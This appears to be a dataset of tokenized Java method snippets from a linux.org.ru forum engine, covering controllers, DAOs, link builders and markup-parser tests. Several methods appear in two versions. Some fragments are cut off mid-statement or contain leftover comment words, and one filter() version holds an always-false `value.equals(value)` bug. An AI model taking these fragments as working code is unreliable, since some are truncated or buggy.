public Set < Integer > makeHideSet ( CommentList comments , int filterChain , @Nonnull Set < Integer > ignoreList ) throws SQLException , UserNotFoundException { if ( filterChain = = CommentFilter . FILTER_NONE ) { return ImmutableSet . of ( ) ; } Set < Integer > hideSet = new HashSet < > ( ) ; if ( ( filterChain & CommentFilter . FILTER_IGNORED ) > 0 ) { if ( ! ignoreList . isEmpty ( ) ) { comments . getRoot ( ) . hideIgnored ( hideSet , ignoreList ) ; } } return hideSet ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage ) { List < TopicsListItem > topicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; try { author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } ImmutableList < String > tags = topicTagService . getMessageTagsForTitle ( rs . getInt ( " msgid " ) ) ; TopicsListItem topic = new TopicsListItem ( author , rs , messagesInPage , tags ) ; topicsList . add ( topic ) ; } return topicsList ; } 
public ModelAndView handleRequestInternal ( @RequestParam ( " section " ) int sectionid ) { Section section = sectionService . getSection ( sectionid ) ; Map < String , Object > params = new HashMap < > ( ) ; params . put ( " section " , section ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " section " , params ) ; } 
private static Map < String , Object > createDefaultProfile ( ) { Map < String , Object > defaults = new HashMap < > ( ) ; defaults . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; defaults . put ( HOVER_PROPERTY , Boolean . TRUE ) ; defaults . put ( STYLE_PROPERTY , " tango " ) ; defaults . put ( FORMAT_MODE_PROPERTY , " quot " ) ; defaults . put ( TOPICS_PROPERTY , 30 ) ; defaults . put ( MESSAGES_PROPERTY , 50 ) ; defaults . put ( TAGS_PROPERTY , 50 ) ; defaults . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; defaults . put ( TIMESTAMP_PROPERTY , System . currentTimeMillis ( ) ) ; defaults . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; defaults . put ( AVATAR_PROPERTY , " empty " ) ; defaults . put ( HIDE_ADSENSE_PROPERTY , true ) ; defaults . put ( MAIN_GALLERY_PROPERTY , false ) ; defaults . put ( SHOW_SOCIAL_PROPERTY , true ) ; defaults . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of( "ibm", "poll", "top10", "gallery", "tagcloud", "archive", "tshirt" ); defaults.put(BOXES_MAIN2_PROPERTY, boxes); return defaults; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId ) { Map < String , Object > params = new HashMap < > ( ) ; params . put ( " sectionId " , sectionId ) ; Section section = sectionService . getSection ( sectionId ) ; params . put ( " section " , section ) ; params . put ( " info " , sectionService . getAddInfo ( section . getId ( ) ) ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public List < PersonalizedPreparedTopic > prepareMessagesForUser ( List < Topic > messages , boolean secure , User user , ProfileProperties profileProperties , boolean loadUserpics ) { List < PersonalizedPreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , user , textMap . get ( message . getId ( ) ) , null ) ; TopicMenu topicMenu = getTopicMenu ( preparedMessage , user , secure , profileProperties , loadUserpics ) ; pm . add ( new PersonalizedPreparedTopic ( preparedMessage , topicMenu ) ) ; } return pm ; } 
public List < PreparedTopic > prepareMessages ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < > ( messages . size ( ) ) ; Map < Integer , MessageText > textMap = loadTexts ( messages ) ; ImmutableListMultimap < Integer , String > tags = messageDao . getTags ( messages ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , tags . get ( message . getId ( ) ) , true , null , secure , null , textMap . get ( message . getId ( ) ) , null ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) throws Exception { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void addEvent ( String eventType , int userId , boolean isPrivate , Integer topicId , Integer commentId , String message ) { Map < String , Object > params = new HashMap < > ( ) ; params . put ( " userid " , userId ) ; params . put ( " type " , eventType ) ; params . put ( " private " , isPrivate ) ; if ( topicId ! = null ) { params . put ( " message_id " , topicId ) ; } if ( commentId ! = null ) { params . put ( " comment_id " , commentId ) ; } if ( message ! = null ) { params . put ( " message " , message ) ; } insert . execute ( params ) ; } 
private Map < Integer , User > createIgnoreMap ( Set < Integer > ignoreList ) { Map < Integer , User > ignoreMap = new HashMap < > ( ignoreList . size ( ) ) ; for ( int id : ignoreList ) { try { ignoreMap . put ( id , userDao . getUserCached ( id ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } } return ignoreMap ; } 
private void addComment ( String s ) { if ( comments = = null ) { tcomments = new ArrayList < > ( ) ; } tcomments . add ( s ) ; } 
public void voteCreateAndRunningPollTest ( ) throws Exception { List < String > pollList = new ArrayList < > ( ) ; pollList . add ( " Case 1 " ) ; pollList . add ( " Case 2 " ) ; pollList . add ( " Case 3 " ) ; try { pollDao . createPoll ( pollList , true , TEST_TOPIC_ID ) ; 
public void setAsText ( String text ) throws IllegalArgumentException { setValue ( groupDao . getGroup ( Integer . parseInt ( text ) ) ) ; } 
public String formatJump ( TopicDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( _topic_id ! = - 1 ) { Topic message = messageDao . getById ( _topic_id ) ; Group group = messageDao . getGroup ( message ) ; String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = getHost ( ) ; int port = getPort ( ) ; String path = group . getUrl ( ) + _topic_id ; String query = " " ; if ( _comment_id ! = - 1 ) { query = " cid= " + _comment_id ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setSection ( sectionService . getSectionByName ( section ) . getId ( ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public TopTenMessageDTO mapRow ( ResultSet rs , int i ) throws SQLException { TopTenMessageDTO result = new TopTenMessageDTO ( ) ; result . setUrl ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; result . setTitle ( rs . getString ( " title " ) ) ; result . setLastmod ( rs . getTimestamp ( " lastmod " ) ) ; result . setAnswers ( rs . getInt ( " c " ) ) ; return result ; } 
public UserEvent mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; int cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { cAuthor = resultSet . getInt ( " cAuthor " ) ; cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = 0 ; } int groupId = resultSet . getInt ( " groupid " ) ; int msgid = resultSet . getInt ( " msgid " ) ; UserEventFilterEnum type = UserEventFilterEnum . valueOfByType ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; boolean unread = resultSet . getBoolean ( " unread " ) ; return new UserEvent ( cid , cAuthor , cDate , groupId , subj , lastmod , msgid , type , eventMessage , eventDate , unread ) ; 
public String getNewsViewerLink ( ) throws SectionNotFoundException { switch ( id ) { case SECTION_FORUM : 
public Group getGroup ( int id ) throws GroupNotFoundException { try { return jdbcTemplate . queryForObject ( 
public Group getGroup ( Section section , String name ) throws GroupNotFoundException { try { int id = jdbcTemplate . queryForInt ( " SELECT id FROM groups WHERE section=? AND urlname=? " , section . getId ( ) , name ) ; 
public ModelAndView handleNotFoundException ( ) { return new ModelAndView ( " errors/code404 " ) ; } 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , false ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , false ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , false ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, false)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, false)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, false)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, false)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, false)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, false)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, false)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, false)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, false)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, false)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, false)); user assertEquals("<p><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[user]splinter[/user]", false, false)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, false)); 
public ModelAndView handleUserError ( Exception ex ) { return new ModelAndView ( " reset-password-form " , " error " , ex . getMessage ( ) ) ; } 
public ModelAndView getMessageNewMain ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , 0 , filter , groupName , msgid ) ; } 
public ModelAndView getMessageNewPage ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @PathVariable ( " section " ) String sectionName , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @PathVariable ( " page " ) int page ) throws Exception { Section section = sectionService . getSectionByName ( sectionName ) ; return getMessageNew ( section , webRequest , request , response , page , filter , groupName , msgid ) ; } 
public static TopicLinkBuilder baseLink ( Topic topic ) { return new TopicLinkBuilder ( topic , 0 , false , false , null , null ) ; } 
public static TopicLinkBuilder pageLink ( Topic topic , int page ) { return new TopicLinkBuilder ( topic , page , false , false , null , null ) ; } 
public TopicLinkBuilder showDeleted ( ) { if ( ! showDeleted ) { return new TopicLinkBuilder ( topic , page , true , lastmod , comment , filter ) ; 
public TopicLinkBuilder forceLastmod ( ) { if ( ! lastmod ) { return new TopicLinkBuilder ( topic , page , showDeleted , true , comment , filter ) ; 
public TopicLinkBuilder comment ( int cid ) { if ( comment = = null | | comment ! = cid ) { return new TopicLinkBuilder ( topic , page , showDeleted , lastmod , cid , filter ) ; 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter String value = CommentFilter.toString(filter); if (!value.equals(value)) { return new TopicLinkBuilder(topic, page, showDeleted, lastmod, comment, value); 
public String build ( ) { UriComponentsBuilder builder = UriComponentsBuilder . fromUriString ( topic . getLinkPage ( page ) ) ; if ( showDeleted ) { builder . queryParam ( " deleted " , " true " ) ; } if ( lastmod ) { builder . queryParam ( " lastmod " , topic . getLastModified ( ) . getTime ( ) ) ; } if ( comment ! = null ) { builder . fragment ( " comment- " + comment ) ; } if ( filter ! = null ) { builder . queryParam ( " filter " , filter ) ; } return builder . build ( ) . toUriString ( ) ; } 
public boolean isHasPrevious ( ) { return hasPrevious ; } 
public boolean isCurrent ( ) { return current ; } 
public TopicLinkBuilder page ( int page ) { if ( page ! = this . page ) { return new TopicLinkBuilder ( topic , page , showDeleted , lastmod , comment , filter ) ; 
public void setup ( ) { mockMvc = webAppContextSetup ( wac ) . build ( ) ; } 
public void testJumpToComment ( ) throws Exception { mockMvc . perform ( get ( " /forum/talks/1920001?cid=1920019 " ) 
public TopicController topicController ( ) { return new TopicController ( ) ; } 
public ReCaptcha reCaptcha ( ) { return mock ( ReCaptcha . class ) ; } 
public Properties properties ( ) throws IOException { Properties properties = new Properties ( ) ; properties . load ( new FileInputStream ( " src/main/webapp/WEB-INF/config.properties.dist " ) ) ; return properties ; } 
public TopicLinkBuilder filter ( int filter ) { TODO: use Enum for filter String value = CommentFilter.toString(filter); if (!value.equals(this.filter)) { return new TopicLinkBuilder(topic, page, showDeleted, lastmod, comment, value); 
public void updateUserCounters ( ) { jdbcTemplate . update ( " DELETE FROM user_comment_counts " ) ; jdbcTemplate . update ( " INSERT INTO user_comment_counts (SELECT userid, count(*) FROM comments GROUP BY userid HAVING count(*)>1000) " ) ; } 
public boolean isExactCommentCount ( ) { return exactCommentCount ; } 
public void updateUserCounters ( ) { jdbcTemplate . update ( " DELETE FROM user_comment_counts " ) ; jdbcTemplate . update ( " INSERT INTO user_comment_counts (SELECT userid, count(*) FROM comments WHERE NOT deleted GROUP BY userid HAVING count(*)>1000) " ) ; } 
public void testLoadBase ( ) throws Exception { mockMvc . perform ( get ( " /forum/talks/1920001 " ) 
public void testLoadBaseZeroComments ( ) throws Exception { mockMvc . perform ( get ( " /forum/linux-org-ru/1948720 " ) 
public void testWrongPage ( ) throws Exception { mockMvc . perform ( get ( " /forum/talks/1920001/page10 " ) 
public void testZeroCommentsWrongPage ( ) throws Exception { mockMvc . perform ( get ( " /forum/linux-org-ru/1948720/page10 " ) 
public void testLoadBaseZeroComments ( ) throws Exception { mockMvc . perform ( get ( " /polls/polls/98075 " ) 
public void testZeroCommentsWrongPage ( ) throws Exception { mockMvc . perform ( get ( " /polls/polls/98075/page10 " ) 
private boolean isContainReplacementCharset ( String str ) { for ( char c : str . toCharArray ( ) ) { if ( c = = 65533 ) { return true ; } } return false ; } 
public ModelAndView tagFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String tag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , required = false ) Integer section ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setTag ( tag ) ; topicListForm . setOffset ( offset ) ; topicListForm . setSection ( section ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; modelAndView . addObject ( " topicListRequest " , topicListForm ) ; Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( tagService . getTagId ( tag ) ) ) ; modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView tagFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String tag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) throws Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setTag ( tag ) ; topicListForm . setOffset ( offset ) ; topicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; modelAndView . addObject ( " topicListRequest " , topicListForm ) ; Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( tagService . getTagId ( tag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView polls ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_POLLS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /polls/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_POLLS ) , topicListForm ) ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , topicListForm ) ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; topicListForm . setSection ( sectionObject . getId ( ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionObject , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest topicListForm , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( topicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , group ) ; StringBuilder ptitle = new StringBuilder ( ) ; ptitle . append ( section . getName ( ) ) ; if ( group ! = null ) { ptitle . append ( " - " ) . append ( group . getTitle ( ) ) ; } modelAndView . addObject ( " ptitle " , ptitle . toString ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; modelAndView . addObject ( " params " , null ) ; return modelAndView ; } 
public ModelAndView tagFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String tag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) throws Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setTag ( tag ) ; topicListForm . setOffset ( offset ) ; topicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " tag " , tag ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " offset " , offset ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " params " , null ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( tagService . getTagId ( tag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView tagFeed ( HttpServletRequest request , HttpServletResponse response , @PathVariable String tag , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset , @RequestParam ( value = " section " , defaultValue = " 0 " ) int sectionId ) throws Exception { Section section ; if ( sectionId ! = 0 ) { section = sectionService . getSection ( sectionId ) ; } else { section = null ; } TopicListRequest topicListForm = new TopicListRequest ( ) ; topicListForm . setTag ( tag ) ; topicListForm . setOffset ( offset ) ; topicListForm . setSection ( sectionId ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " tag " , tag ) ; modelAndView . addObject ( " section " , section ) ; modelAndView . addObject ( " offset " , offset ) ; modelAndView . addObject ( " sectionList " , sectionService . getSectionList ( ) ) ; Template tmpl = Template . getTemplate ( request ) ; if ( tmpl . isSessionAuthorized ( ) ) { modelAndView . addObject ( " isShowFavoriteTagButton " , ! userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnFavoriteTagButton " , userTagService . hasFavoriteTag ( tmpl . getCurrentUser ( ) , tag ) ) ; if ( ! tmpl . isModeratorSession ( ) ) { modelAndView . addObject ( " isShowIgnoreTagButton " , ! userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; modelAndView . addObject ( " isShowUnIgnoreTagButton " , userTagService . hasIgnoreTag ( tmpl . getCurrentUser ( ) , tag ) ) ; } } modelAndView . addObject ( " counter " , tagService . getCounter ( tag ) ) ; modelAndView . addObject ( " url " , tagListUrl ( tag ) ) ; modelAndView . addObject ( " favsCount " , userTagService . countFavs ( tagService . getTagId ( tag ) ) ) ; if ( sectionId = = 0 ) { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) ) ; } else { modelAndView . addObject ( " ptitle " , WordUtils . capitalize ( tag ) + " ( " + section . getName ( ) + " ) " ) ; } modelAndView . setViewName ( " tag-topics " ) ; return modelAndView ; } 
public ModelAndView gallery ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_GALLERY ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_GALLERY ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/ " ) ; return modelAndView ; } 
public ModelAndView forum ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_FORUM ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_FORUM ) , topicListForm ) ) ; modelAndView . addObject ( " url " , " /forum/lenta " ) ; return modelAndView ; } 
public ModelAndView news ( HttpServletRequest request , TopicListRequest topicListForm , HttpServletResponse response ) throws Exception { topicListForm . setSection ( Section . SECTION_NEWS ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " url " , " /news/ " ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionService . getSection ( Section . SECTION_NEWS ) , topicListForm ) ) ; return modelAndView ; } 
public ModelAndView galleryArchive ( HttpServletRequest request , @PathVariable String section , @PathVariable int year , @PathVariable int month , HttpServletResponse response ) throws Exception { TopicListRequest topicListForm = new TopicListRequest ( ) ; Section sectionObject = sectionService . getSectionByName ( section ) ; topicListForm . setSection ( sectionObject . getId ( ) ) ; topicListForm . setYear ( year ) ; topicListForm . setMonth ( month ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , null ) ; modelAndView . addObject ( " ptitle " , calculatePTitle ( sectionObject , topicListForm ) ) ; modelAndView . addObject ( " url " , " /gallery/archive/ " + year + '/' + month + '/' ) ; return modelAndView ; } 
private ModelAndView group ( HttpServletRequest request , TopicListRequest topicListForm , String groupName , HttpServletResponse response ) throws Exception { Section section = sectionService . getSection ( topicListForm . getSection ( ) ) ; Group group = groupDao . getGroup ( section , groupName ) ; ModelAndView modelAndView = mainTopicsFeedHandler ( request , topicListForm , response , group ) ; StringBuilder ptitle = new StringBuilder ( ) ; ptitle . append ( section . getName ( ) ) ; if ( group ! = null ) { ptitle . append ( " - " ) . append ( group . getTitle ( ) ) ; } modelAndView . addObject ( " ptitle " , ptitle . toString ( ) ) ; modelAndView . addObject ( " url " , group . getUrl ( ) ) ; return modelAndView ; } 
